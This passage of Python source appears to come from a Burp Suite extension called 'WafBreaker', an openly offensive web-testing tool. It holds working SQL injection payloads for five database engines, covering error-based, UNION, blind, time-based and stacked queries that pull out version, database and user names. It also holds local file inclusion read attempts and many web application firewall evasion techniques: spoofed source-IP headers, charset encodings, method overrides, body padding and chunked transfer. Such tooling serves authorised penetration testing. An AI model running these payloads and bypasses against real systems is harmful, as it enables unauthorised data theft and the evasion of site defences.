                if self._response_matches_baseline(fp_s, fp_b) or (
                        not self._response_differs(fp_s, fp_b)):
                    self._log("[+] DB variant: %s" % fp_db)
                    db_variant = fp_db
                    break

        # ── Step 5: POC enumeration + consolidated single issue ───────────────
        self._log("[1.5] SQLi CONFIRMED — repair: %s%s  → running POC enumeration..." % (
            confirmed_label, (" | DB: " + db_variant) if db_variant else ""))
        self._sqli_confirm_and_poc(
            break_payload    = break_payload,
            break_label      = break_label,
            repair_payload   = confirmed_repair,
            repair_label     = confirmed_label,
            db_variant       = db_variant,
            bool_confirmed   = bool_confirmed,
            source           = "Break &amp; Repair",
        )

    # ═════════════════════════════════════════════════════════════════════════
    #   POC ENUMERATION HELPERS
    # ═════════════════════════════════════════════════════════════════════════

    def _phase_sqli_poc(self, db_variant):
        """
        Attempt lightweight error-based POC enumeration after SQLi confirmation.
        Returns a dict: {label: (payload, extracted_value)} for each successful probe.
        Tries version, current_db, current_user for the identified DB engine.
        Falls back to trying all engines if db_variant is not identified.
        """
        results = {}

        # Error extraction patterns for each DB's error format
        _extract_patterns = {
            "mysql":      [
                r"XPATH syntax error: '~([^~]+)~'",
                r"~([^~]+)~",
            ],
            "mssql":      [
                r"nvarchar value '([^']+)' to data",
                r"Converting the nvarchar value '([^']+)'",
                r"Conversion failed.*?'([^']+)'",
            ],
            "postgresql": [
                r'integer: "([^"]+)"',
                r"type integer: \"([^\"]+)\"",
            ],
            "oracle":     [
                r"ORA-01722.*?\"([^\"]+)\"",
                r"invalid number.*?'([^']+)'",
            ],
            "sqlite":     [
                r"datatype mismatch.*?([0-9.]+)",
                r"could not convert.*?\"([^\"]+)\"",
            ],
        }

        # Payloads per DB: (label, payload_template)
        # Inject as a standalone payload — param gets this full value
        _poc_probes = {
            "mysql": [
                ("db_version",   "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))-- -"),
                ("current_db",   "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))-- -"),
                ("current_user", "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))-- -"),
            ],
            "mssql": [
                ("db_version",   "' AND 1=CONVERT(INT,(SELECT @@version))-- -"),
                ("current_db",   "' AND 1=CONVERT(INT,(SELECT DB_NAME()))-- -"),
                ("current_user", "' AND 1=CONVERT(INT,(SELECT SYSTEM_USER))-- -"),
            ],
            "postgresql": [
                ("db_version",   "' AND 1=CAST((SELECT version()) AS INTEGER)-- -"),
                ("current_db",   "' AND 1=CAST((SELECT current_database()) AS INTEGER)-- -"),
                ("current_user", "' AND 1=CAST((SELECT current_user) AS INTEGER)-- -"),
            ],
            "oracle": [
                ("db_version",   "' AND 1=(SELECT TO_NUMBER(banner) FROM v$version WHERE rownum=1)-- -"),
                ("current_db",   "' AND 1=(SELECT TO_NUMBER(global_name) FROM global_name)-- -"),
            ],
            "sqlite": [
                ("db_version",   "' AND 1=CAST(sqlite_version() AS INTEGER)-- -"),
                ("current_db",   "' AND 1=CAST(sqlite_compileoption_get(0) AS INTEGER)-- -"),
            ],
        }

        # Determine which DB to try
        db_key = None
        if db_variant:
            dv = db_variant.lower()
            if "mysql" in dv or "mariadb" in dv:
                db_key = "mysql"
            elif "mssql" in dv or "sql server" in dv:
                db_key = "mssql"
            elif "postgre" in dv or "pgsql" in dv:
                db_key = "postgresql"
            elif "oracle" in dv:
                db_key = "oracle"
            elif "sqlite" in dv:
                db_key = "sqlite"

        # If not identified, try MySQL first (most common), then MSSQL
        db_order = [db_key] if db_key else ["mysql", "mssql", "postgresql"]

        for db in db_order:
            if db not in _poc_probes:
                continue
            probes = _poc_probes[db]
            patterns = _extract_patterns.get(db, [])
            got_any = False

            for poc_label, poc_payload in probes:
                kwargs = {}
                pp, pkw = self._apply_bypass(poc_payload, kwargs)
                req = self._build_request(pp, **pkw)
                status, body = self._send(req)
                self._report("[POC] %s/%s" % (db, poc_label), poc_payload, status, body,
                             self._outcome(status, body))

                # Try to extract the leaked value from the error
                extracted = ""
                for pat in patterns:
                    m = re.search(pat, body, re.IGNORECASE | re.DOTALL)
                    if m:
                        extracted = m.group(1).strip()[:200]
                        break
                # Fallback: if VULN! fires (pattern-based detection), note that
                if not extracted and self._is_vuln(status, body):
                    extracted = "<reflected in response — check response body>"

                if extracted:
                    got_any = True
                    results[poc_label] = (poc_payload, extracted)
                    self._log("[POC] %s → %s" % (poc_label, extracted[:80]))

            if got_any:
                break   # Found working DB — no need to try others

        # ── Technique 2: UNION-based version extraction ───────────────────────
        # Try ORDER BY to detect column count, then UNION SELECT @@version.
        # Works when error-based is patched/disabled but UNION responses differ.
        if not results:
            self._log("[POC] Trying UNION-based extraction...")
            results.update(self._phase_sqli_poc_union())

        # ── Technique 3: Boolean-blind version fingerprinting ─────────────────
        # Quick substring checks — confirms type even without data exfil.
        if not results:
            self._log("[POC] Trying boolean-blind version check...")
            results.update(self._phase_sqli_poc_blind())

        # ── Technique 4: Time-based version detection ─────────────────────────
        # IF(version_char='x',SLEEP(3),0) — slower but works in pure blind.
        if not results:
            self._log("[POC] Trying time-based fingerprinting...")
            results.update(self._phase_sqli_poc_time())

        # ── Technique 5: Stacked-query version dump ───────────────────────────
        if not results:
            self._log("[POC] Trying stacked-query dump...")
            results.update(self._phase_sqli_poc_stacked())

        return results

    # ─────────────────────────────────────────────────────────────────────────
    #   UNION-based POC: detect column count via ORDER BY, then extract version
    # ─────────────────────────────────────────────────────────────────────────
    def _phase_sqli_poc_union(self):
        """
        POC: use UNION SELECT to extract db version.
        Steps:
          1. Probe ORDER BY 1..8 to find column count (look for error on ORDER BY N+1)
          2. Build UNION SELECT with NULLs + @@version in first string column
          3. Also tries distinctrow (Claroty bypass) and /**/comment bypass
        """
        results = {}
        try:
            # Step 1: find column count
            base_s, base_b = self._send(self._build_request("'"))
            prev_error = self._is_vuln(base_s, base_b)
            col_count = None

            for n in range(1, 9):
                p = "' ORDER BY %d-- -" % n
                kw = {}
                pp, pkw = self._apply_bypass(p, kw)
                req = self._build_request(pp, **pkw)
                s, b = self._send(req)
                oc = self._outcome(s, b)
                self._report("[POC-UNION] ORDER BY %d" % n, p, s, b, oc)
                is_err = self._is_vuln(s, b)
                # Column count = n-1 if ORDER BY n causes an error and n-1 didn't
                if is_err and not prev_error and n > 1:
                    col_count = n - 1
                    self._log("[POC-UNION] Column count detected: %d" % col_count)
                    break
                prev_error = is_err

            if col_count is None:
                col_count = 3  # fallback

            # Step 2: try UNION SELECT with @@version in each position
            _version_fns = [
                ("mysql",      "@@version"),
                ("mysql",      "@@global.version_compile_os"),
                ("postgresql", "version()"),
                ("mssql",      "@@version"),
                ("sqlite",     "sqlite_version()"),
            ]
            for db_hint, ver_fn in _version_fns:
                for pos in range(col_count):
                    cols = ["NULL"] * col_count
                    cols[pos] = ver_fn
                    # Plain
                    p = "' UNION SELECT %s-- -" % ",".join(cols)
                    for p_variant in [
                        p,
                        p.replace("UNION SELECT", "UNION/**/SELECT"),
                        p.replace("UNION SELECT", "UNION ALL SELECT"),
                        p.replace("UNION SELECT", "UNION distinctrow SELECT"),
                    ]:
                        kw = {}
                        pp, pkw = self._apply_bypass(p_variant, kw)
                        req = self._build_request(pp, **pkw)
                        s, b = self._send(req)
                        oc = self._outcome(s, b)
                        self._report("[POC-UNION] %s col%d" % (db_hint, pos), p_variant, s, b, oc)
                        # Check if version string appeared in response
                        ver_match = re.search(
                            r'(\d+\.\d+[^\s<>"\']{0,30})', b)
                        if ver_match and not self._is_blocked(s, b):
                            extracted = ver_match.group(1)
                            results["union_version_%s" % db_hint] = (p_variant, extracted)
                            self._log("[POC-UNION] Extracted: %s" % extracted)
                            return results  # first success is enough
        except Exception as ex:
            self._log("[POC-UNION] Error: %s" % str(ex))
        return results

    # ─────────────────────────────────────────────────────────────────────────
    #   Boolean-blind version fingerprinting: quick SUBSTRING checks
    # ─────────────────────────────────────────────────────────────────────────
    def _phase_sqli_poc_blind(self):
        """
        POC: send TRUE and FALSE boolean payloads with version substring checks.
        If TRUE differs from FALSE in status/body length, we can fingerprint DB type.
        Only tests a handful of well-known first-character hints — keeps it fast.
        """
        results = {}
        try:
            baseline_req = self._build_request("1")
            base_s, base_b = self._send(baseline_req)

            _blind_probes = [
                ("mysql5",   "' AND SUBSTRING(@@version,1,1)='5'-- -"),
                ("mysql8",   "' AND SUBSTRING(@@version,1,1)='8'-- -"),
                ("pgsql",    "' AND SUBSTRING(version(),1,1)='P'-- -"),
                ("mssql",    "' AND SUBSTRING(@@VERSION,1,1)='M'-- -"),
                ("sqlite",   "' AND SUBSTRING(sqlite_version(),1,1)='3'-- -"),
                ("any_true", "' AND '1'='1'-- -"),
                ("any_false","' AND '1'='2'-- -"),
            ]

            true_s, true_b, false_s, false_b = None, None, None, None

            for label, probe in _blind_probes:
                kw = {}
                pp, pkw = self._apply_bypass(probe, kw)
                req = self._build_request(pp, **pkw)
                s, b = self._send(req)
                oc = self._outcome(s, b)
                self._report("[POC-BLIND] %s" % label, probe, s, b, oc)

                if label == "any_true":
                    true_s, true_b = s, b
                elif label == "any_false":
                    false_s, false_b = s, b

            # Compare true vs false vs baseline — if lengths differ, blind confirmed
            if true_b is not None and false_b is not None:
                diff = abs(len(true_b) - len(false_b))
                if diff > 20 or true_s != false_s:
                    results["blind_confirmed"] = (
                        "' AND '1'='1' vs '1'='2'-- -",
                        "Boolean blind detected (true/false response diff: %d bytes)" % diff
                    )
                    self._log("[POC-BLIND] Confirmed: true/false diff = %d bytes" % diff)
        except Exception as ex:
            self._log("[POC-BLIND] Error: %s" % str(ex))
        return results

    # ─────────────────────────────────────────────────────────────────────────
    #   Time-based version fingerprinting
    # ─────────────────────────────────────────────────────────────────────────
    def _phase_sqli_poc_time(self):
        """
        POC: IF(version_char_match, SLEEP(3), 0) style probes for MySQL/MSSQL/PgSQL.
        Measures actual response time to confirm time-based blind.
        """
        results = {}
        try:
            import time as _time

            # Baseline timing
            b_req = self._build_request("1")
            t0 = _time.time()
            self._send(b_req)
            baseline_ms = (_time.time() - t0) * 1000

            _time_probes = [
                ("mysql_sleep",   "' AND SLEEP(3)-- -",          3000),
                ("mysql_ver_5",   "' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(3),0)-- -", 3000),
                ("mysql_ver_8",   "' AND IF(SUBSTRING(@@version,1,1)='8',SLEEP(3),0)-- -", 3000),
                ("mssql_delay",   "'; WAITFOR DELAY '0:0:3'-- -",  3000),
                ("pgsql_sleep",   "' AND pg_sleep(3)-- -",         3000),
                ("sqlite_blob",   "' AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(250000000/2))))-- -", 2000),
            ]

            for label, probe, threshold_ms in _time_probes:
                kw = {}
                pp, pkw = self._apply_bypass(probe, kw)
                req = self._build_request(pp, **pkw)
                t0 = _time.time()
                s, b = self._send(req)
                elapsed_ms = (_time.time() - t0) * 1000
                oc = self._outcome(s, b)
                self._report("[POC-TIME] %s" % label, probe, s, b, oc)
                self._log("[POC-TIME] %s: %.0fms (baseline %.0fms)" % (
                    label, elapsed_ms, baseline_ms))

                # Triggered if response exceeded baseline by at least threshold
                if elapsed_ms > baseline_ms + threshold_ms - 500:
                    results["time_" + label] = (
                        probe,
                        "Delayed %.0fms (baseline %.0fms) — time-based blind confirmed"
                        % (elapsed_ms, baseline_ms)
                    )
                    self._log("[POC-TIME] Time-based SQLi confirmed via %s" % label)
                    break   # one confirmation is enough
        except Exception as ex:
            self._log("[POC-TIME] Error: %s" % str(ex))
        return results

    # ─────────────────────────────────────────────────────────────────────────
    #   Stacked-query POC: ; SELECT @@version-- -
    # ─────────────────────────────────────────────────────────────────────────
    def _phase_sqli_poc_stacked(self):
        """
        POC: semicolon-stacked SELECT — works on MSSQL, PostgreSQL with PDO.
        If version string appears in response, stacked confirmed.
        """
        results = {}
        try:
            _stacked = [
                ("mssql",  "'; SELECT @@version-- -"),
                ("pgsql",  "'; SELECT version()-- -"),
                ("mysql",  "'; SELECT @@version-- -"),
                ("any",    "'; SELECT 1,@@version,3-- -"),
            ]
            for label, probe in _stacked:
                kw = {}
                pp, pkw = self._apply_bypass(probe, kw)
                req = self._build_request(pp, **pkw)
                s, b = self._send(req)
                oc = self._outcome(s, b)
                self._report("[POC-STACK] %s" % label, probe, s, b, oc)
                ver_m = re.search(r'(\d+\.\d+[^\s<>"\']{0,30})', b)
                if ver_m and not self._is_blocked(s, b):
                    results["stacked_%s" % label] = (probe, ver_m.group(1))
                    self._log("[POC-STACK] Extracted via stacked: %s" % ver_m.group(1))
                    break
        except Exception as ex:
            self._log("[POC-STACK] Error: %s" % str(ex))
        return results

    def _sqli_confirm_and_poc(self, break_payload, break_label,
                              repair_payload, repair_label,
                              db_variant, bool_confirmed, source,
                              extra_payload=None, bypass_desc=None):
        """
        Called the FIRST time SQLi is confirmed for this scan.
        Runs POC enumeration, then files ONE consolidated Burp issue.
        Subsequent confirmed payloads just get logged — no new issues.
        """
        if "SQL Injection" in self._issued_high:
            # Already filed — just append this evidence as a log note
            if extra_payload:
                ev = self._vuln_extra_payloads.setdefault("SQL Injection", [])
                ev.append(extra_payload)
            self._log("[SQLi] Additional confirmation: %s (no new issue — already filed)"
                      % (extra_payload or repair_payload)[:80])
            return

        self._issued_high.add("SQL Injection")

        # ── Run POC DB enumeration ────────────────────────────────────────────
        poc = self._phase_sqli_poc(db_variant)

        # ── Build consolidated issue detail ───────────────────────────────────
        conf_str = "Certain" if bool_confirmed else "Firm"
        db_line  = db_variant if db_variant else "not identified"

        bypass_line = ""
        if not bypass_desc and self._bypass:
            bypass_desc = self._bypass.get("name", self._bypass["type"])
        if bypass_desc:
            bypass_line = "<br>WAF bypass used: <b>%s</b>" % bypass_desc

        # POC results table
        if poc:
            poc_rows = ""
            for lbl, (pp, val) in poc.items():
                poc_rows += (
                    "<tr><td><b>%s</b></td>"
                    "<td><code>%s</code></td>"
                    "<td>%s</td></tr>"
                    % (lbl, pp[:120], val)
                )
            poc_html = (
                "<br><b>POC Enumeration Results:</b><br>"
                "<table border='1' cellpadding='4'>"
                "<tr><th>Query</th><th>Payload</th><th>Extracted Value</th></tr>"
                "%s</table>" % poc_rows
            )
        else:
            poc_html = ("<br><i>Error-based extraction did not leak data — "
                        "backend may suppress error messages.  "
                        "Blind extraction is possible with the confirmed repair payload.</i>")

        detail = (
            "WafBreaker confirmed <b>SQL Injection</b> via <b>%s</b>.<br><br>"
            "Break payload:&nbsp;&nbsp;<code>%s</code> (%s)<br>"
            "Repair payload: <code>%s</code> (%s)<br>"
            "Database engine: <b>%s</b><br>"
            "Boolean differential: %s%s<br>"
            "%s"
            % (
                source,
                break_payload, break_label,
                repair_payload, repair_label,
                db_line,
                "<b>confirmed</b> (TRUE vs FALSE responses differ)"
                if bool_confirmed else "not verified (diff analysis inconclusive)",
                bypass_line,
                poc_html,
            )
        )

        title = "SQL Injection Confirmed — %s%s" % (
            source,
            (" [%s]" % db_variant) if db_variant else "",
        )

        self._add_issue(title, detail, severity="High", confidence=conf_str)
        self._log("[SQLi] Consolidated issue filed: %s | DB: %s | POC: %d queries extracted"
                  % (source, db_line, len(poc)))

    # ═════════════════════════════════════════════════════════════════════════
    #   PHASE 3.9 — LFI FILE CONFIRMATION
    #   Targeted file-read attempts to prove actual LFI, not just WAF bypass.
    #   Applies the active bypass to each target path.
    #   PHP wrapper paths skip the bypass transform (they're self-contained).
    # ═════════════════════════════════════════════════════════════════════════
    def _phase_confirm_lfi(self):
        if self._vtype != "LFI":
            return
        self._log("[Phase 3.9] LFI targeted file confirmation (%d paths)..." % len(LFI_TARGET_FILES))

        # Collect ALL confirmed file reads first, then emit ONE consolidated issue
        confirmed_files = []   # list of (file_label, file_path, matched_desc, snippet)

        for (file_path, file_label, skip_bypass) in LFI_TARGET_FILES:
            kwargs = {}
            if skip_bypass:
                fp, fkw = file_path, {}
            else:
                fp, fkw = self._apply_bypass(file_path, kwargs)
            req = self._build_request(fp, **fkw)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[LFI Confirm] " + file_label, file_path, status, body, oc)

            matched_desc = None
            if oc == "VULN!":
                matched_desc = "standard LFI pattern matched"
            else:
                for pat, desc in LFI_CONFIRM_PATTERNS:
                    if re.search(pat, body, re.IGNORECASE):
                        matched_desc = desc
                        break

            if matched_desc:
                snippet = body[:600].replace('<', '&lt;').replace('>', '&gt;')
                self._log("[+] LFI confirmed reading: %s (%s)" % (file_label, matched_desc))
                confirmed_files.append((file_label, file_path, matched_desc, snippet))

        if not confirmed_files:
            self._log("[Phase 3.9 complete] No targeted file reads confirmed.")
            return

        # ── Build ONE consolidated LFI issue ─────────────────────────────────
        bypass_line = ""
        if self._bypass:
            bn = self._bypass.get("name", self._bypass["type"])
            bypass_line = "<br>WAF bypass used: <b>%s</b>" % bn

        # Summary table header
        rows_html = ""
        for (fl, fp, md, snip) in confirmed_files:
            rows_html += (
                "<tr>"
                "<td><b>%s</b></td>"
                "<td><code>%s</code></td>"
                "<td>%s</td>"
                "</tr>"
                % (fl, fp, md)
            )

        # Content snippets for each confirmed file
        snippets_html = ""
        for (fl, fp, md, snip) in confirmed_files:
            snippets_html += (
                "<br><b>%s</b> (<code>%s</code>):<br>"
                "<pre>%s</pre>"
                % (fl, fp, snip)
            )

        detail = (
            "WafBreaker confirmed <b>Local File Inclusion</b> — "
            "<b>%d file(s)</b> successfully read.%s<br><br>"
            "<b>Confirmed file reads:</b><br>"
            "<table border='1' cellpadding='4'>"
            "<tr><th>File</th><th>Path injected</th><th>Detection</th></tr>"
            "%s"
            "</table>"
            "%s"
            % (len(confirmed_files), bypass_line, rows_html, snippets_html)
        )

        # Confidence based on how many files were read + whether passwd was among them
        has_passwd = any("/etc/passwd" in fp or "passwd" in fl.lower()
                         for (fl, fp, _, __) in confirmed_files)
        conf_str = "Certain" if (has_passwd or len(confirmed_files) >= 2) else "Firm"

        title = "LFI Confirmed — %d File Read%s" % (
            len(confirmed_files),
            "s" if len(confirmed_files) != 1 else "",
        )

        # Only file once — if somehow this phase runs twice, deduplicate
        if "LFI" not in self._issued_high:
            self._issued_high.add("LFI")
            self._add_issue(title, detail, severity="High", confidence=conf_str)
            self._log("[Phase 3.9 complete] %d file read(s) confirmed → 1 consolidated issue filed."
                      % len(confirmed_files))
        else:
            self._log("[Phase 3.9 complete] %d file read(s) confirmed (already filed, no new issue)."
                      % len(confirmed_files))

    # ═════════════════════════════════════════════════════════════════════════
    #   MAIN EXECUTION
    # ═════════════════════════════════════════════════════════════════════════
    def run(self):
        self._log("=" * 55)
        self._log("Scan started  |  target: %s:%d" % (
            self._svc.getHost(), self._svc.getPort()))

        probe = INITIAL_PROBES[self._vtype]

        # ── Phase 1: Initial probe ────────────────────────────────────────────
        self._log("[Phase 1]  Initial probe → " + probe[:60])
        req = self._build_request(probe)
        status, body = self._send(req)
        oc = self._outcome(status, body)
        self._report("Initial Probe", probe, status, body, oc)

        if self._is_blocked(status, body):
            self._log("[!] WAF detected (HTTP %d).  Engaging bypass phase..." % status)
            self._waf_found = True

            # Capture blocked-response fingerprint for adaptive _is_blocked() scoring
            self._blocked_baseline = {
                "len":     len(body),
                "status":  status,
                "snippet": body[:200].lower(),
            }

            # Identify which WAF vendor we're dealing with
            try:
                if self._last_http_msg:
                    _rraw = self._last_http_msg.getResponse()
                    if _rraw:
                        _ranalyzed = self._h.analyzeResponse(_rraw)
                        _rhdrs = list(_ranalyzed.getHeaders())
                        _rhdrs_str = "\n".join(_rhdrs)
                        self._waf_vendor = self._fingerprint_waf(_rhdrs_str, body)
            except Exception:
                pass

            _vendor_str = (" [vendor: %s]" % self._waf_vendor) if self._waf_vendor else ""
            self._add_issue(
                "WAF Detected — %s" % self._vtype,
                "A Web Application Firewall blocked the initial <b>%s</b> probe.<br>"
                "Probe payload: <code>%s</code><br>"
                "Response status: <b>%d</b>%s<br>"
                "WafBreaker will now attempt bypass techniques in Phase 2."
                % (self._vtype, probe[:300], status,
                   ("<br>Identified vendor: <b>%s</b>" % self._waf_vendor)
                   if self._waf_vendor else ""),
                severity="Information",
                confidence="Firm",
            )
            self._phase_bypass(probe)
        else:
            self._log("[+] No WAF block on probe (HTTP %d).  Skipping bypass phase." % status)

        # ── Phase 1.5: Break & Repair — confirms SQLi + fingerprints DB variant ─
        self._phase_break_repair()

        # ── Phase 3: Full payload sweep ───────────────────────────────────────
        self._phase_payloads()

        # ── Phase 3.5: Blind XSS (OOB via Burp Collaborator) ─────────────────
        if self._vtype == "XSS":
            self._phase_blind_xss()

        # ── Phase 3.9: LFI targeted file confirmation ─────────────────────────
        self._phase_confirm_lfi()

        # ── Phase 4: Tamper sweep across all SQLi categories (SQLi only) ──────
        self._phase_tamper_sweep()

        self._log("=" * 55)
        self._log("Scan complete — %d requests sent." % self._req_count)

    # ═════════════════════════════════════════════════════════════════════════
    #   PHASE 2 — WAF BYPASS TECHNIQUES
    # ═════════════════════════════════════════════════════════════════════════
    def _phase_bypass(self, probe):
        self._log("[Phase 2]  Testing bypass techniques...")

        # Log vendor fingerprint and targeted bypass hints for the tester
        if self._waf_vendor:
            self._log("[Phase 2]  WAF vendor: %s" % self._waf_vendor.upper())
            hints = WAF_VENDOR_BYPASS_HINTS.get(self._waf_vendor, [])
            if hints:
                self._log("[Phase 2]  Vendor bypass hints: %s" % ", ".join(hints))

        # ── 2-A: HTTP Header Trust ────────────────────────────────────────────
        # Article: WAFs trust X-Forwarded-For etc. to determine source IP
        self._log("[2-A] HTTP Header Trust...")

        header_sets = [
            (["X-Forwarded-For: 127.0.0.1"],                          "XFF: 127.0.0.1"),
            (["X-Originating-IP: 127.0.0.1"],                         "X-Orig-IP: 127.0.0.1"),
            (["X-Remote-IP: 127.0.0.1"],                              "X-Remote-IP: 127.0.0.1"),
            (["X-Remote-Addr: 127.0.0.1"],                            "X-Remote-Addr: 127.0.0.1"),
            (["X-Client-IP: 127.0.0.1"],                              "X-Client-IP: 127.0.0.1"),
            (["X-Real-IP: 127.0.0.1"],                                "X-Real-IP: 127.0.0.1"),
            (["True-Client-IP: 127.0.0.1"],                           "True-Client-IP: 127.0.0.1"),
            (["Cluster-Client-IP: 127.0.0.1"],                        "Cluster-Client-IP"),
            (["Forwarded: for=127.0.0.1"],                            "Forwarded RFC7239"),
            (["X-Forwarded-For: 10.0.0.1"],                           "XFF: 10.0.0.1"),
            (["X-Forwarded-For: 192.168.0.1"],                        "XFF: 192.168.0.1"),
            ([   # All at once — belt and suspenders
                "X-Forwarded-For: 127.0.0.1",
                "X-Originating-IP: 127.0.0.1",
                "X-Remote-IP: 127.0.0.1",
                "X-Remote-Addr: 127.0.0.1",
                "X-Client-IP: 127.0.0.1",
                "X-Real-IP: 127.0.0.1",
            ], "All Trust Headers"),
        ]

        for hdrs, label in header_sets:
            req = self._build_request(probe, extra_headers=hdrs)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] " + label, probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Header bypass WORKED: " + label)
                self._bypass = {"type": "header", "headers": hdrs}

        # ── 2-B: Charset manipulation (ibm037 / EBCDIC) ───────────────────────
        # Article: charset=ibm037 makes WAF unable to read payload; backend decodes it fine
        self._log("[2-B] Charset manipulation (ibm037)...")

        encoded_probe = ibm037_encode(probe)
        req = self._build_request(encoded_probe, charset="ibm037")
        status, body = self._send(req)
        oc = self._outcome(status, body)
        self._report("[Bypass] Charset: ibm037", encoded_probe, status, body, oc)
        if not self._is_blocked(status, body) and not self._bypass:
            self._log("[+] ibm037 charset bypass WORKED!")
            self._bypass = {"type": "charset_ibm037"}

        # utf-7
        req = self._build_request(probe, charset="utf-7")
        status, body = self._send(req)
        oc = self._outcome(status, body)
        self._report("[Bypass] Charset: utf-7", probe, status, body, oc)
        if not self._is_blocked(status, body) and not self._bypass:
            self._bypass = {"type": "charset", "cs": "utf-7"}

        # utf-16
        req = self._build_request(probe, charset="utf-16")
        status, body = self._send(req)
        oc = self._outcome(status, body)
        self._report("[Bypass] Charset: utf-16", probe, status, body, oc)
        if not self._is_blocked(status, body) and not self._bypass:
            self._bypass = {"type": "charset", "cs": "utf-16"}

        # Wave-3 extended charsets — East Asian encodings; WAF regex engines
        # almost never handle multi-byte encodings, so payload bytes shift
        # entirely out of the ASCII range the WAF expects.
        _extra_charsets = [
            "utf-32",       # 4-byte encoding; trivially defeats byte-oriented WAF
            "shift_jis",    # Japanese; ASCII letters map to 2-byte SJIS sequences
            "gbk",          # Chinese; double-byte overlap tricks
            "gb2312",       # Simplified Chinese subset of GBK
            "euc-kr",       # Korean; payload letters expand to 2-byte EUC sequences
            "iso-2022-jp",  # JIS encoding; uses ESC sequences in stream
        ]
        for _cs in _extra_charsets:
            if self._bypass:
                break
            req = self._build_request(probe, charset=_cs)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] Charset: %s" % _cs, probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Charset bypass WORKED: %s" % _cs)
                self._bypass = {"type": "charset", "cs": _cs, "name": "charset-" + _cs}

        # ── 2-C: HTTP Method manipulation ─────────────────────────────────────
        # Article: WAF may only inspect known verbs; unknown verbs bypass inspection
        self._log("[2-C] HTTP Method override...")

        for method in ["TestingWafBypass", "FUZZ", "WAFBYPASS", "OPTIONS"]:
            req = self._build_request(probe, override_method=method)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] Method: " + method,
                                 probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Method bypass WORKED: " + method)
                self._bypass = {"type": "method", "verb": method}

        # ── 2-D: Large body padding (nowafpls technique) ──────────────────────
        # Article: WAF inspects only first N KB; padding pushes payload past limit
        self._log("[2-D] Body size padding (%d KB)..." % (self.JUNK_SIZE_BYTES // 1024))

        req = self._build_request(probe, add_junk=True)
        status, body = self._send(req)
        oc = self._outcome(status, body)
        self._report("[Bypass] Body padding ~%dKB" % (
            self.JUNK_SIZE_BYTES // 1024), probe, status, body, oc)
        if not self._is_blocked(status, body) and not self._bypass:
            self._log("[+] Body-size bypass WORKED!")
            self._bypass = {"type": "junk"}

        # ── 2-E: X-HTTP-Method-Override & tunnelling headers ──────────────────
        self._log("[2-E] X-HTTP-Method-Override headers...")

        for oh in [
            ["X-HTTP-Method-Override: GET"],
            ["X-HTTP-Method-Override: PUT"],
            ["X-Method-Override: GET"],
            ["_method=GET"],
            ["X-HTTP-Method: DELETE"],
        ]:
            req = self._build_request(probe, extra_headers=oh)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] " + oh[0][:40],
                                 probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Override header bypass WORKED: " + oh[0])
                self._bypass = {"type": "override_header", "headers": oh}

        # ── 2-F: WAF-confusing Content-Type values ────────────────────────────
        self._log("[2-F] Content-Type confusion...")

        ct_tests = [
            (["Content-Type: application/json"],             "CT: json"),
            (["Content-Type: text/xml"],                     "CT: xml"),
            (["Content-Type: application/x-www-form-urlencoded; boundary=--"], "CT: boundary"),
            (["Content-Type: multipart/form-data; boundary=----Boundary"],     "CT: multipart"),
        ]
        for hdrs, label in ct_tests:
            req = self._build_request(probe, extra_headers=hdrs)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] " + label,
                                 probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Content-Type confusion bypass WORKED: " + label)
                self._bypass = {"type": "ct", "headers": hdrs}

        # ── 2-G: SQLMap-style tamper probes (SQL Injection only) ─────────────────
        # Each tamper function is applied to the raw probe string.
        # The first one that passes the WAF becomes the active tamper bypass.
        if self._vtype == "SQL Injection":
            self._log("[2-G] Tamper script probes (%d tampers)..." % len(SQLI_TAMPERS))
            for (tname, tfunc, tdesc, tdb) in SQLI_TAMPERS:
                try:
                    tampered_probe = tfunc(probe)
                except Exception:
                    continue
                if tampered_probe == probe:
                    continue    # tamper had no effect on this probe — skip
                req = self._build_request(tampered_probe)
                status, body = self._send(req)
                oc = self._outcome(status, body)
                self._report(
                    "[Bypass] Tamper: %s" % tname,
                    tampered_probe, status, body, oc)
                if not self._is_blocked(status, body) and not self._bypass:
                    self._log("[+] Tamper bypass WORKED: %s (%s)" % (tname, tdesc))
                    self._bypass = {"type": "tamper", "func": tfunc, "name": tname}

        # ── 2-H: True multi-chunk Chunked Transfer-Encoding bypass ─────────────
        # Split body into tiny chunks so WAF regex never matches across boundaries.
        # Test 1-byte (maximum fragmentation), 8-byte, and space-split variants.
        self._log("[2-H] Multi-chunk Chunked TE (1B / 8B / space-split)...")
        _base_chunked_hdrs = [
            "Transfer-Encoding: chunked",
            "Content-Type: application/x-www-form-urlencoded",
        ]
        _chunked_variants = [
            (1,    "1-byte-chunks"),
            (8,    "8-byte-chunks"),
            (None, "space-split-chunks"),
        ]
        for _csize, _clabel in _chunked_variants:
            if self._bypass:
                break
            req = self._build_request(probe, extra_headers=_base_chunked_hdrs)
            try:
                crlf = bytearray([13, 10])
                req_lines = req.split(crlf)
                blank_idx = None
                for _i, _rln in enumerate(req_lines):
                    if len(_rln) == 0:
                        blank_idx = _i
                        break
                if blank_idx is not None:
                    body_bytes = bytes(crlf.join(req_lines[blank_idx + 1:]))
                    if _csize is None:
                        parts = body_bytes.split(b' ')
                        chunked_body = bytearray()
                        for _j, _part in enumerate(parts):
                            piece = _part if _j == 0 else b' ' + _part
                            chunked_body += bytearray(('%X' % len(piece)).encode('ascii')) + crlf
                            chunked_body += bytearray(piece) + crlf
                        chunked_body += bytearray(b'0') + crlf + crlf
                    else:
                        chunked_body = _chunked_encode(body_bytes, _csize)
